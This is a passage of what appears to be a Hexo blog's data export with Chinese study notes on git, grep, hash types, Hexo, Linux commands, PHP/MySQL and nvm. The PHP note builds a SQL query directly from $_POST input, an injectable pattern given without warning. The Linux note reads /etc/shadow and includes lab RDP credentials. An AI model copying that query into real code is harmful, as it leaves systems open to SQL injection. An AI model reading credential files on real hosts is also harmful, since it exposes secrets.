git@github.com\n","slug":"git基礎","published":1,"updated":"2025-06-01T04:06:13.481Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwaa000nzrlr41ypaxvg","content":"<p>git clone 下載目標檔案</p>\n<pre><code>git clone https://github.com/D-Sketon/hexo-theme-reimu.git\ngit clone https://github.com/D-Sketon/reimu-template\n</code></pre>\n<p>查看歷史</p>\n<pre><code>git log \ngit log --perl-regexp --author=&#39;^(?!picoCTF &lt;ops@picoctf\\.com&gt;).*$&#39;\n</code></pre>\n<p>切換到 </p>\n<pre><code>git switch --detach b562f0b425907789d11d2fe2793e67592dc6be93\ngit switch master\ngit switch feature/part-1\n</code></pre>\n<p>顯示分支</p>\n<pre><code>git branch\n</code></pre>\n<p>git教學</p>\n<pre><code>git remote remove origin\ngit remote add origin git@github.com:itamiokanjiro/itamiokanjiro.github.io.git\ngit remote set-url origin git@github.com:itamiokanjiro/itamiokanjiro.github.io.git\n</code></pre>\n<p>產生金鑰</p>\n<pre><code>ssh-keygen -t rsa -b 4096 -C &quot;a234123234a@gmail.com&quot;\ncat ~/.ssh/id_rsa.pub\n\n\n\nssh-keygen -t ed25519 -C &quot;a234123234a@gmail.com&quot;\ncat ~/.ssh/id_ed25519.pub\n</code></pre>\n<p>設定作者</p>\n<pre><code>git config user.name &quot;你的 GitHub 使用者名稱&quot;\n</code></pre>\n<p>設定信箱</p>\n<pre><code>git config user.email &quot;你的 GitHub 郵箱&quot;\n</code></pre>\n<p>查看修改 狀況</p>\n<pre><code>git status   \n</code></pre>\n<p>刪除跟蹤</p>\n<pre><code>git rm -r --cached 跟CTF無關/\n</code></pre>\n<p>推送遠端</p>\n<pre><code>git push -u origin main\n</code></pre>\n<p>更新用</p>\n<pre><code>git commit -m &quot;更新&quot;\n</code></pre>\n<p>測試連接</p>\n<pre><code>ssh -T git@github.com\n</code></pre>\n","excerpt":"","more":"<p>git clone 下載目標檔案</p>\n<pre><code>git clone https://github.com/D-Sketon/hexo-theme-reimu.git\ngit clone https://github.com/D-Sketon/reimu-template\n</code></pre>\n<p>查看歷史</p>\n<pre><code>git log \ngit log --perl-regexp --author=&#39;^(?!picoCTF &lt;ops@picoctf\\.com&gt;).*$&#39;\n</code></pre>\n<p>切換到 </p>\n<pre><code>git switch --detach b562f0b425907789d11d2fe2793e67592dc6be93\ngit switch master\ngit switch feature/part-1\n</code></pre>\n<p>顯示分支</p>\n<pre><code>git branch\n</code></pre>\n<p>git教學</p>\n<pre><code>git remote remove origin\ngit remote add origin git@github.com:itamiokanjiro/itamiokanjiro.github.io.git\ngit remote set-url origin git@github.com:itamiokanjiro/itamiokanjiro.github.io.git\n</code></pre>\n<p>產生金鑰</p>\n<pre><code>ssh-keygen -t rsa -b 4096 -C &quot;a234123234a@gmail.com&quot;\ncat ~/.ssh/id_rsa.pub\n\n\n\nssh-keygen -t ed25519 -C &quot;a234123234a@gmail.com&quot;\ncat ~/.ssh/id_ed25519.pub\n</code></pre>\n<p>設定作者</p>\n<pre><code>git config user.name &quot;你的 GitHub 使用者名稱&quot;\n</code></pre>\n<p>設定信箱</p>\n<pre><code>git config user.email &quot;你的 GitHub 郵箱&quot;\n</code></pre>\n<p>查看修改 狀況</p>\n<pre><code>git status   \n</code></pre>\n<p>刪除跟蹤</p>\n<pre><code>git rm -r --cached 跟CTF無關/\n</code></pre>\n<p>推送遠端</p>\n<pre><code>git push -u origin main\n</code></pre>\n<p>更新用</p>\n<pre><code>git commit -m &quot;更新&quot;\n</code></pre>\n<p>測試連接</p>\n<pre><code>ssh -T git@github.com\n</code></pre>\n"},{"title":"grep基礎","date":"2025-05-30T13:20:06.000Z","_content":"\ngrep只能找內容\n-r = 循環所有子目錄 \n-a 是讓 grep 把二進位檔（binary files）當成純文字檔來讀取\n~/ 是要搜尋的目錄路徑 ~ 代表使用者家目錄  如果目錄有空格要用\\ 區隔\n    grep -a -r \"uuuuutest\" ~/\n    grep -r \"flaghasher\" /\n\n尋找檔案名為flaghasher的檔案\n\n    find / -iname \"*flaghasher*\"","source":"_posts/grep基礎.md","raw":"---\ntitle: grep基礎\ndate: 2025-05-30 21:20:06\ntags:\ncategories:\n  - linux\n---\n\ngrep只能找內容\n-r = 循環所有子目錄 \n-a 是讓 grep 把二進位檔（binary files）當成純文字檔來讀取\n~/ 是要搜尋的目錄路徑 ~ 代表使用者家目錄  如果目錄有空格要用\\ 區隔\n    grep -a -r \"uuuuutest\" ~/\n    grep -r \"flaghasher\" /\n\n尋找檔案名為flaghasher的檔案\n\n    find / -iname \"*flaghasher*\"","slug":"grep基礎","published":1,"updated":"2025-06-01T17:22:20.172Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwaa000ozrlrcg0f7ni1","content":"<p>grep只能找內容<br>-r &#x3D; 循環所有子目錄<br>-a 是讓 grep 把二進位檔（binary files）當成純文字檔來讀取<br>~&#x2F; 是要搜尋的目錄路徑 ~ 代表使用者家目錄  如果目錄有空格要用\\ 區隔<br>    grep -a -r “uuuuutest” ~&#x2F;<br>    grep -r “flaghasher” &#x2F;</p>\n<p>尋找檔案名為flaghasher的檔案</p>\n<pre><code>find / -iname &quot;*flaghasher*&quot;\n</code></pre>\n","excerpt":"","more":"<p>grep只能找內容<br>-r &#x3D; 循環所有子目錄<br>-a 是讓 grep 把二進位檔（binary files）當成純文字檔來讀取<br>~&#x2F; 是要搜尋的目錄路徑 ~ 代表使用者家目錄  如果目錄有空格要用\\ 區隔<br>    grep -a -r “uuuuutest” ~&#x2F;<br>    grep -r “flaghasher” &#x2F;</p>\n<p>尋找檔案名為flaghasher的檔案</p>\n<pre><code>find / -iname &quot;*flaghasher*&quot;\n</code></pre>\n"},{"title":"hash類型","date":"2025-05-30T10:43:08.000Z","_content":"\n482c811da5d5b4bc6d497ffa98491e38\n屬於MD5  MD5可以爆破\n長度 32 hex 字元（16 bytes）\n格式 0–9, a–f 的十六進位\n\n\nb7a875fc1ea228b9061041b7cec4bd3c52ab3ce3\nSHA-1 雜湊值\n長度 40 字元（hex）\n\n\n\n916e8c4f79b25028c9e467f1eb8eee6d6bbdff965f9928310ad30a8d88697745\nSHA-256雜湊\n彩虹表攻擊\n\n\n每個字元屬於4bits\n\n| Hash 類型 | 用途            | 安全建議        |\n| ------- | ------------- | ----------- |\n| MD5     | 舊系統、檔案檢查碼     | ❌ 不建議用於安全場景 |\n| SHA-256 | JWT、HTTPS、區塊鏈 | ✅ 安全且普遍     |\n| bcrypt  | 密碼儲存          | ✅ 安全且抗暴力破解  |\n| Argon2  | 密碼儲存          | ✅ 現代推薦      |\n| CRC32   | 傳輸校驗          | ❌ 無法抵抗惡意修改  |\n\n\n\n\n| 名稱             | 輸出長度                 | 特徵與用途                    |\n| -------------- | -------------------- | ------------------------ |\n| **MD5**        | 128 bits             | 已被破解，不建議使用，但常見於舊系統、文件完整性 |\n| **SHA-1**      | 160 bits             | 已被碰撞攻擊擊破，不建議用於安全場景       |\n| **SHA-2**      | 224/256/384/512 bits | 安全性高，目前主流，如 SHA-256      |\n| **SHA-3**      | 可變長度                 | 標準替代 SHA-2，抗量子攻擊特性更佳     |\n| **BLAKE2**     | 可變長度                 | 比 SHA-2 更快，安全性高          |\n| **RIPEMD-160** | 160 bits             | 早期替代 SHA-1，使用較少          |\n","source":"_posts/hash類型.md","raw":"---\ntitle: hash類型\ndate: 2025-05-30 18:43:08\ncategories:\n  - linux\n---\n\n482c811da5d5b4bc6d497ffa98491e38\n屬於MD5  MD5可以爆破\n長度 32 hex 字元（16 bytes）\n格式 0–9, a–f 的十六進位\n\n\nb7a875fc1ea228b9061041b7cec4bd3c52ab3ce3\nSHA-1 雜湊值\n長度 40 字元（hex）\n\n\n\n916e8c4f79b25028c9e467f1eb8eee6d6bbdff965f9928310ad30a8d88697745\nSHA-256雜湊\n彩虹表攻擊\n\n\n每個字元屬於4bits\n\n| Hash 類型 | 用途            | 安全建議        |\n| ------- | ------------- | ----------- |\n| MD5     | 舊系統、檔案檢查碼     | ❌ 不建議用於安全場景 |\n| SHA-256 | JWT、HTTPS、區塊鏈 | ✅ 安全且普遍     |\n| bcrypt  | 密碼儲存          | ✅ 安全且抗暴力破解  |\n| Argon2  | 密碼儲存          | ✅ 現代推薦      |\n| CRC32   | 傳輸校驗          | ❌ 無法抵抗惡意修改  |\n\n\n\n\n| 名稱             | 輸出長度                 | 特徵與用途                    |\n| -------------- | -------------------- | ------------------------ |\n| **MD5**        | 128 bits             | 已被破解，不建議使用，但常見於舊系統、文件完整性 |\n| **SHA-1**      | 160 bits             | 已被碰撞攻擊擊破，不建議用於安全場景       |\n| **SHA-2**      | 224/256/384/512 bits | 安全性高，目前主流，如 SHA-256      |\n| **SHA-3**      | 可變長度                 | 標準替代 SHA-2，抗量子攻擊特性更佳     |\n| **BLAKE2**     | 可變長度                 | 比 SHA-2 更快，安全性高          |\n| **RIPEMD-160** | 160 bits             | 早期替代 SHA-1，使用較少          |\n","slug":"hash類型","published":1,"updated":"2025-06-01T17:21:14.665Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwaa000qzrlr9bij3bto","content":"<p>482c811da5d5b4bc6d497ffa98491e38<br>屬於MD5  MD5可以爆破<br>長度 32 hex 字元（16 bytes）<br>格式 0–9, a–f 的十六進位</p>\n<p>b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3<br>SHA-1 雜湊值<br>長度 40 字元（hex）</p>\n<p>916e8c4f79b25028c9e467f1eb8eee6d6bbdff965f9928310ad30a8d88697745<br>SHA-256雜湊<br>彩虹表攻擊</p>\n<p>每個字元屬於4bits</p>\n<table>\n<thead>\n<tr>\n<th>Hash 類型</th>\n<th>用途</th>\n<th>安全建議</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>MD5</td>\n<td>舊系統、檔案檢查碼</td>\n<td>❌ 不建議用於安全場景</td>\n</tr>\n<tr>\n<td>SHA-256</td>\n<td>JWT、HTTPS、區塊鏈</td>\n<td>✅ 安全且普遍</td>\n</tr>\n<tr>\n<td>bcrypt</td>\n<td>密碼儲存</td>\n<td>✅ 安全且抗暴力破解</td>\n</tr>\n<tr>\n<td>Argon2</td>\n<td>密碼儲存</td>\n<td>✅ 現代推薦</td>\n</tr>\n<tr>\n<td>CRC32</td>\n<td>傳輸校驗</td>\n<td>❌ 無法抵抗惡意修改</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>輸出長度</th>\n<th>特徵與用途</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>MD5</strong></td>\n<td>128 bits</td>\n<td>已被破解，不建議使用，但常見於舊系統、文件完整性</td>\n</tr>\n<tr>\n<td><strong>SHA-1</strong></td>\n<td>160 bits</td>\n<td>已被碰撞攻擊擊破，不建議用於安全場景</td>\n</tr>\n<tr>\n<td><strong>SHA-2</strong></td>\n<td>224&#x2F;256&#x2F;384&#x2F;512 bits</td>\n<td>安全性高，目前主流，如 SHA-256</td>\n</tr>\n<tr>\n<td><strong>SHA-3</strong></td>\n<td>可變長度</td>\n<td>標準替代 SHA-2，抗量子攻擊特性更佳</td>\n</tr>\n<tr>\n<td><strong>BLAKE2</strong></td>\n<td>可變長度</td>\n<td>比 SHA-2 更快，安全性高</td>\n</tr>\n<tr>\n<td><strong>RIPEMD-160</strong></td>\n<td>160 bits</td>\n<td>早期替代 SHA-1，使用較少</td>\n</tr>\n</tbody></table>\n","excerpt":"","more":"<p>482c811da5d5b4bc6d497ffa98491e38<br>屬於MD5  MD5可以爆破<br>長度 32 hex 字元（16 bytes）<br>格式 0–9, a–f 的十六進位</p>\n<p>b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3<br>SHA-1 雜湊值<br>長度 40 字元（hex）</p>\n<p>916e8c4f79b25028c9e467f1eb8eee6d6bbdff965f9928310ad30a8d88697745<br>SHA-256雜湊<br>彩虹表攻擊</p>\n<p>每個字元屬於4bits</p>\n<table>\n<thead>\n<tr>\n<th>Hash 類型</th>\n<th>用途</th>\n<th>安全建議</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>MD5</td>\n<td>舊系統、檔案檢查碼</td>\n<td>❌ 不建議用於安全場景</td>\n</tr>\n<tr>\n<td>SHA-256</td>\n<td>JWT、HTTPS、區塊鏈</td>\n<td>✅ 安全且普遍</td>\n</tr>\n<tr>\n<td>bcrypt</td>\n<td>密碼儲存</td>\n<td>✅ 安全且抗暴力破解</td>\n</tr>\n<tr>\n<td>Argon2</td>\n<td>密碼儲存</td>\n<td>✅ 現代推薦</td>\n</tr>\n<tr>\n<td>CRC32</td>\n<td>傳輸校驗</td>\n<td>❌ 無法抵抗惡意修改</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>輸出長度</th>\n<th>特徵與用途</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>MD5</strong></td>\n<td>128 bits</td>\n<td>已被破解，不建議使用，但常見於舊系統、文件完整性</td>\n</tr>\n<tr>\n<td><strong>SHA-1</strong></td>\n<td>160 bits</td>\n<td>已被碰撞攻擊擊破，不建議用於安全場景</td>\n</tr>\n<tr>\n<td><strong>SHA-2</strong></td>\n<td>224&#x2F;256&#x2F;384&#x2F;512 bits</td>\n<td>安全性高，目前主流，如 SHA-256</td>\n</tr>\n<tr>\n<td><strong>SHA-3</strong></td>\n<td>可變長度</td>\n<td>標準替代 SHA-2，抗量子攻擊特性更佳</td>\n</tr>\n<tr>\n<td><strong>BLAKE2</strong></td>\n<td>可變長度</td>\n<td>比 SHA-2 更快，安全性高</td>\n</tr>\n<tr>\n<td><strong>RIPEMD-160</strong></td>\n<td>160 bits</td>\n<td>早期替代 SHA-1，使用較少</td>\n</tr>\n</tbody></table>\n"},{"title":"hexo基礎","date":"2025-05-30T13:34:48.000Z","_content":"hexo new創建一個新文章名為666\n\n    hexo new \"666\"\n\n\nhexo g建置   並且cp -r 複製所有public/ 目錄下的檔案 發送到/var/www/html3/\n\n    hexo g && cp -r public/* /var/www/html2/\n\nhexo 初始化\n\n    hexo init\n\nnpm install 根據當前資料夾中的package.json 依賴進行更新\n\n    npm install \n\nhexo server啟動  -i 開放0.0.0.0 端口4000 \n\n    hexo server -i 0.0.0.0 -p 4000\n\n\nnpx 會先在本地 node_modules（專案資料夾的套件目錄）尋找 hexo，如果找不到，會臨時從網路下載並執行。\n\n    npx hexo server -i 0.0.0.0 -p 4000\n\n\n快速CICD\n\n    npm install hexo-deployer-git --save\n    hexo clean && hexo g && hexo d\n\n\n\n開發 上傳\n\n    deploy:\n    type: git\n    repo: https://github.com/你的帳號/你的repo.git\n    branch: gh-pages\n\n\nHEXO嵌入圖片\n\n    ![網路層](/image/lay.jpg)\n\n\n顏色\n\n    <span style=\"color:blue\">#換顏色</span>\n\n\n","source":"_posts/hexo基礎.md","raw":"---\ntitle: hexo基礎\ndate: 2025-05-30 21:34:48\ntags:\ncategories:\n  - 網站部署基礎\n\n---\nhexo new創建一個新文章名為666\n\n    hexo new \"666\"\n\n\nhexo g建置   並且cp -r 複製所有public/ 目錄下的檔案 發送到/var/www/html3/\n\n    hexo g && cp -r public/* /var/www/html2/\n\nhexo 初始化\n\n    hexo init\n\nnpm install 根據當前資料夾中的package.json 依賴進行更新\n\n    npm install \n\nhexo server啟動  -i 開放0.0.0.0 端口4000 \n\n    hexo server -i 0.0.0.0 -p 4000\n\n\nnpx 會先在本地 node_modules（專案資料夾的套件目錄）尋找 hexo，如果找不到，會臨時從網路下載並執行。\n\n    npx hexo server -i 0.0.0.0 -p 4000\n\n\n快速CICD\n\n    npm install hexo-deployer-git --save\n    hexo clean && hexo g && hexo d\n\n\n\n開發 上傳\n\n    deploy:\n    type: git\n    repo: https://github.com/你的帳號/你的repo.git\n    branch: gh-pages\n\n\nHEXO嵌入圖片\n\n    ![網路層](/image/lay.jpg)\n\n\n顏色\n\n    <span style=\"color:blue\">#換顏色</span>\n\n\n","slug":"hexo基礎","published":1,"updated":"2025-06-04T10:43:38.304Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwab000rzrlr3yiid3hh","content":"<p>hexo new創建一個新文章名為666</p>\n<pre><code>hexo new &quot;666&quot;\n</code></pre>\n<p>hexo g建置   並且cp -r 複製所有public&#x2F; 目錄下的檔案 發送到&#x2F;var&#x2F;www&#x2F;html3&#x2F;</p>\n<pre><code>hexo g &amp;&amp; cp -r public/* /var/www/html2/\n</code></pre>\n<p>hexo 初始化</p>\n<pre><code>hexo init\n</code></pre>\n<p>npm install 根據當前資料夾中的package.json 依賴進行更新</p>\n<pre><code>npm install \n</code></pre>\n<p>hexo server啟動  -i 開放0.0.0.0 端口4000 </p>\n<pre><code>hexo server -i 0.0.0.0 -p 4000\n</code></pre>\n<p>npx 會先在本地 node_modules（專案資料夾的套件目錄）尋找 hexo，如果找不到，會臨時從網路下載並執行。</p>\n<pre><code>npx hexo server -i 0.0.0.0 -p 4000\n</code></pre>\n<p>快速CICD</p>\n<pre><code>npm install hexo-deployer-git --save\nhexo clean &amp;&amp; hexo g &amp;&amp; hexo d\n</code></pre>\n<p>開發 上傳</p>\n<pre><code>deploy:\ntype: git\nrepo: https://github.com/你的帳號/你的repo.git\nbranch: gh-pages\n</code></pre>\n<p>HEXO嵌入圖片</p>\n<pre><code>![網路層](/image/lay.jpg)\n</code></pre>\n<p>顏色</p>\n<pre><code>&lt;span style=&quot;color:blue&quot;&gt;#換顏色&lt;/span&gt;\n</code></pre>\n","excerpt":"","more":"<p>hexo new創建一個新文章名為666</p>\n<pre><code>hexo new &quot;666&quot;\n</code></pre>\n<p>hexo g建置   並且cp -r 複製所有public&#x2F; 目錄下的檔案 發送到&#x2F;var&#x2F;www&#x2F;html3&#x2F;</p>\n<pre><code>hexo g &amp;&amp; cp -r public/* /var/www/html2/\n</code></pre>\n<p>hexo 初始化</p>\n<pre><code>hexo init\n</code></pre>\n<p>npm install 根據當前資料夾中的package.json 依賴進行更新</p>\n<pre><code>npm install \n</code></pre>\n<p>hexo server啟動  -i 開放0.0.0.0 端口4000 </p>\n<pre><code>hexo server -i 0.0.0.0 -p 4000\n</code></pre>\n<p>npx 會先在本地 node_modules（專案資料夾的套件目錄）尋找 hexo，如果找不到，會臨時從網路下載並執行。</p>\n<pre><code>npx hexo server -i 0.0.0.0 -p 4000\n</code></pre>\n<p>快速CICD</p>\n<pre><code>npm install hexo-deployer-git --save\nhexo clean &amp;&amp; hexo g &amp;&amp; hexo d\n</code></pre>\n<p>開發 上傳</p>\n<pre><code>deploy:\ntype: git\nrepo: https://github.com/你的帳號/你的repo.git\nbranch: gh-pages\n</code></pre>\n<p>HEXO嵌入圖片</p>\n<pre><code>![網路層](/image/lay.jpg)\n</code></pre>\n<p>顏色</p>\n<pre><code>&lt;span style=&quot;color:blue&quot;&gt;#換顏色&lt;/span&gt;\n</code></pre>\n"},{"title":"linux基本命令基礎","date":"2025-05-30T13:40:22.000Z","_content":"重新啟動nginx\n\n    sudo systemctl restart nginx\n\n設定timedatectl的時間  亞洲台北\n\n    sudo timedatectl set-timezone Asia/Taipei\n\n開關 自動 更新時間工具\n\n    sudo timedatectl set-ntp true\n    sudo timedatectl set-ntp false\n\n調整時間為\n\n    sudo date +%T -s \"19:59:00\"\n\n\n顯示時間\n\n    date\n\n\n顯示端口有無人使用\n\n    sudo netstat -tuln | grep 4000\n    COMMAND    PID USER FD   TYPE   DEVICE SIZE/OFF NODE NAME\n\n\n顯示端口使用者進程\n\n    sudo lsof -i :4000\n\n\n砍進程\n\n    sudo kill \n\n查看使用者有無密碼\n\n    cat /etc/shadow\n\n查看使用者能否遠程登入\n\n    cat /etc/passwd\n    getent passwd postgres\n\n禁止postgres登入\n\n    sudo usermod -s /usr/sbin/nologin postgres\n\nwindows用的\n\n    $env:DISPLAY=\"localhost:0.0\"\n    Git bash\n    ssh -Y -p 1998 hacker@192.168.1.104\n    連接上 linux 包含介面\n    apt install freerdp2-x11\n    xfreerdp /v:10.129.43.4 /u:htb-student /p:HTB_@cademy_stdnt!\n\n\n顯示目前工作&幹掉\n\n    jobs\n    kill %1","source":"_posts/linux基本命令基礎.md","raw":"---\ntitle: linux基本命令基礎\ndate: 2025-05-30 21:40:22\ncategories:\n  - linux\n---\n重新啟動nginx\n\n    sudo systemctl restart nginx\n\n設定timedatectl的時間  亞洲台北\n\n    sudo timedatectl set-timezone Asia/Taipei\n\n開關 自動 更新時間工具\n\n    sudo timedatectl set-ntp true\n    sudo timedatectl set-ntp false\n\n調整時間為\n\n    sudo date +%T -s \"19:59:00\"\n\n\n顯示時間\n\n    date\n\n\n顯示端口有無人使用\n\n    sudo netstat -tuln | grep 4000\n    COMMAND    PID USER FD   TYPE   DEVICE SIZE/OFF NODE NAME\n\n\n顯示端口使用者進程\n\n    sudo lsof -i :4000\n\n\n砍進程\n\n    sudo kill \n\n查看使用者有無密碼\n\n    cat /etc/shadow\n\n查看使用者能否遠程登入\n\n    cat /etc/passwd\n    getent passwd postgres\n\n禁止postgres登入\n\n    sudo usermod -s /usr/sbin/nologin postgres\n\nwindows用的\n\n    $env:DISPLAY=\"localhost:0.0\"\n    Git bash\n    ssh -Y -p 1998 hacker@192.168.1.104\n    連接上 linux 包含介面\n    apt install freerdp2-x11\n    xfreerdp /v:10.129.43.4 /u:htb-student /p:HTB_@cademy_stdnt!\n\n\n顯示目前工作&幹掉\n\n    jobs\n    kill %1","slug":"linux基本命令基礎","published":1,"updated":"2025-06-03T23:13:32.054Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwab000szrlr3gvl8ld7","content":"<p>重新啟動nginx</p>\n<pre><code>sudo systemctl restart nginx\n</code></pre>\n<p>設定timedatectl的時間  亞洲台北</p>\n<pre><code>sudo timedatectl set-timezone Asia/Taipei\n</code></pre>\n<p>開關 自動 更新時間工具</p>\n<pre><code>sudo timedatectl set-ntp true\nsudo timedatectl set-ntp false\n</code></pre>\n<p>調整時間為</p>\n<pre><code>sudo date +%T -s &quot;19:59:00&quot;\n</code></pre>\n<p>顯示時間</p>\n<pre><code>date\n</code></pre>\n<p>顯示端口有無人使用</p>\n<pre><code>sudo netstat -tuln | grep 4000\nCOMMAND    PID USER FD   TYPE   DEVICE SIZE/OFF NODE NAME\n</code></pre>\n<p>顯示端口使用者進程</p>\n<pre><code>sudo lsof -i :4000\n</code></pre>\n<p>砍進程</p>\n<pre><code>sudo kill \n</code></pre>\n<p>查看使用者有無密碼</p>\n<pre><code>cat /etc/shadow\n</code></pre>\n<p>查看使用者能否遠程登入</p>\n<pre><code>cat /etc/passwd\ngetent passwd postgres\n</code></pre>\n<p>禁止postgres登入</p>\n<pre><code>sudo usermod -s /usr/sbin/nologin postgres\n</code></pre>\n<p>windows用的</p>\n<pre><code>$env:DISPLAY=&quot;localhost:0.0&quot;\nGit bash\nssh -Y -p 1998 hacker@192.168.1.104\n連接上 linux 包含介面\napt install freerdp2-x11\nxfreerdp /v:10.129.43.4 /u:htb-student /p:HTB_@cademy_stdnt!\n</code></pre>\n<p>顯示目前工作&amp;幹掉</p>\n<pre><code>jobs\nkill %1\n</code></pre>\n","excerpt":"","more":"<p>重新啟動nginx</p>\n<pre><code>sudo systemctl restart nginx\n</code></pre>\n<p>設定timedatectl的時間  亞洲台北</p>\n<pre><code>sudo timedatectl set-timezone Asia/Taipei\n</code></pre>\n<p>開關 自動 更新時間工具</p>\n<pre><code>sudo timedatectl set-ntp true\nsudo timedatectl set-ntp false\n</code></pre>\n<p>調整時間為</p>\n<pre><code>sudo date +%T -s &quot;19:59:00&quot;\n</code></pre>\n<p>顯示時間</p>\n<pre><code>date\n</code></pre>\n<p>顯示端口有無人使用</p>\n<pre><code>sudo netstat -tuln | grep 4000\nCOMMAND    PID USER FD   TYPE   DEVICE SIZE/OFF NODE NAME\n</code></pre>\n<p>顯示端口使用者進程</p>\n<pre><code>sudo lsof -i :4000\n</code></pre>\n<p>砍進程</p>\n<pre><code>sudo kill \n</code></pre>\n<p>查看使用者有無密碼</p>\n<pre><code>cat /etc/shadow\n</code></pre>\n<p>查看使用者能否遠程登入</p>\n<pre><code>cat /etc/passwd\ngetent passwd postgres\n</code></pre>\n<p>禁止postgres登入</p>\n<pre><code>sudo usermod -s /usr/sbin/nologin postgres\n</code></pre>\n<p>windows用的</p>\n<pre><code>$env:DISPLAY=&quot;localhost:0.0&quot;\nGit bash\nssh -Y -p 1998 hacker@192.168.1.104\n連接上 linux 包含介面\napt install freerdp2-x11\nxfreerdp /v:10.129.43.4 /u:htb-student /p:HTB_@cademy_stdnt!\n</code></pre>\n<p>顯示目前工作&amp;幹掉</p>\n<pre><code>jobs\nkill %1\n</code></pre>\n"},{"title":"mysql基礎","date":"2025-06-02T05:00:14.000Z","_content":"\n\nPHP連接mysql\n\n    $conn = new mysqli(\"localhost\", \"user\", \"pass\");\n\n\n    $sql = \"CREATE DATABASE database1\";\n    $conn->query($sql)\n\n    $conn = new mysqli(\"localhost\", \"user\", \"pass\", \"database1\");\n    $query = \"select * from table_1\";\n    $result = $conn->query($query);\n\n\n\n    $searchInput =  $_POST['findUser'];\n    $query = \"select * from users where name like '%$searchInput%'\";\n    $result = $conn->query($query);\n\n    while($row = $result->fetch_assoc() ){\n\techo $row[\"name\"].\"<br>\";\n    }\n\n    \n","source":"_posts/mysql基礎.md","raw":"---\ntitle: mysql基礎\ndate: 2025-06-02 13:00:14\ntags:\n---\n\n\nPHP連接mysql\n\n    $conn = new mysqli(\"localhost\", \"user\", \"pass\");\n\n\n    $sql = \"CREATE DATABASE database1\";\n    $conn->query($sql)\n\n    $conn = new mysqli(\"localhost\", \"user\", \"pass\", \"database1\");\n    $query = \"select * from table_1\";\n    $result = $conn->query($query);\n\n\n\n    $searchInput =  $_POST['findUser'];\n    $query = \"select * from users where name like '%$searchInput%'\";\n    $result = $conn->query($query);\n\n    while($row = $result->fetch_assoc() ){\n\techo $row[\"name\"].\"<br>\";\n    }\n\n    \n","slug":"mysql基礎","published":1,"updated":"2025-06-02T15:55:44.523Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwab000vzrlr1wgh6yek","content":"<p>PHP連接mysql</p>\n<pre><code>$conn = new mysqli(&quot;localhost&quot;, &quot;user&quot;, &quot;pass&quot;);\n\n\n$sql = &quot;CREATE DATABASE database1&quot;;\n$conn-&gt;query($sql)\n\n$conn = new mysqli(&quot;localhost&quot;, &quot;user&quot;, &quot;pass&quot;, &quot;database1&quot;);\n$query = &quot;select * from table_1&quot;;\n$result = $conn-&gt;query($query);\n\n\n\n$searchInput =  $_POST[&#39;findUser&#39;];\n$query = &quot;select * from users where name like &#39;%$searchInput%&#39;&quot;;\n$result = $conn-&gt;query($query);\n\nwhile($row = $result-&gt;fetch_assoc() )&#123;\necho $row[&quot;name&quot;].&quot;&lt;br&gt;&quot;;\n&#125;\n</code></pre>\n","excerpt":"","more":"<p>PHP連接mysql</p>\n<pre><code>$conn = new mysqli(&quot;localhost&quot;, &quot;user&quot;, &quot;pass&quot;);\n\n\n$sql = &quot;CREATE DATABASE database1&quot;;\n$conn-&gt;query($sql)\n\n$conn = new mysqli(&quot;localhost&quot;, &quot;user&quot;, &quot;pass&quot;, &quot;database1&quot;);\n$query = &quot;select * from table_1&quot;;\n$result = $conn-&gt;query($query);\n\n\n\n$searchInput =  $_POST[&#39;findUser&#39;];\n$query = &quot;select * from users where name like &#39;%$searchInput%&#39;&quot;;\n$result = $conn-&gt;query($query);\n\nwhile($row = $result-&gt;fetch_assoc() )&#123;\necho $row[&quot;name&quot;].&quot;&lt;br&gt;&quot;;\n&#125;\n</code></pre>\n"},{"title":"nvm基礎","date":"2025-06-01T11:57:16.000Z","_content":"\n安裝 版本nodejs版本18  使用18  看版本\n\n    nvm install 18\n    nvm use 18\n    node -v","source":"_posts/nvm基礎.md","raw":"---\ntitle: nvm基礎\ndate: 2025-06-01 19:57:16\ntags:\n---\n\n安裝 版本nodejs版本18  使用18  看版本\n\n    nvm install 18\n    nvm use 18\n    node -v","slug":"nvm基礎","published":1,"updated":"2025-06-01T11:57:47.497Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwac000xzrlr8my707cr","content":"<p>安裝 版本nodejs版本18  使用18  看版本</p>\n<pre><code>nvm install 18\nnvm use 18\nnode -v\n</code></pre>\n","excerpt":"","more":"<p>安裝 版本nodejs版本18  使用18  看版本</p>\n<pre><code>nvm install 18\nnvm use 18\nnode -v\n</code></pre>\n"},{"title":"openvpn","date":"2025-06-03T16:38:50.000Z","_content":"\nsudo apt install openvpn\n\nsudo openvpn --config academy-regular.ovpn &\n\n\n\n","source":"_posts/openvpn.md","raw":"---\ntitle: openvpn\ndate: 2025-06-04 00:38:50\ntags:\n---\n\nsudo apt install openvpn\n\nsudo openvpn --config academy-regular.ovpn &\n\n\n\n","slug":"openvpn","published":1,"updated":"2025-06-03T23:11:53.486Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwac000yzrlrhvzy5sv7","content":"<p>sudo apt install openvpn</p>\n<p>sudo openvpn –config academy-regular.ovpn &amp;</p>\n","excerpt":"","more":"<p>sudo apt install openvpn</p>\n<p>sudo openvpn –config academy-regular.ovpn &amp;</p>\n"},{"title":"python技術債草","date":"2025-06-03T23:02:21.000Z","_content":"\n曾經的我  用python寫了很多代碼\n\n自從我用了C++後  發現python真TM狗屎\n\n打包難打包成exe就算了 會整台電腦一起打包 此時當你有安裝大型項目\n\n例如TensorFlow, PyTorch 會涼涼","source":"_posts/python技術債草.md","raw":"---\ntitle: python技術債草\ndate: 2025-06-04 07:02:21\ntags:\n---\n\n曾經的我  用python寫了很多代碼\n\n自從我用了C++後  發現python真TM狗屎\n\n打包難打包成exe就算了 會整台電腦一起打包 此時當你有安裝大型項目\n\n例如TensorFlow, 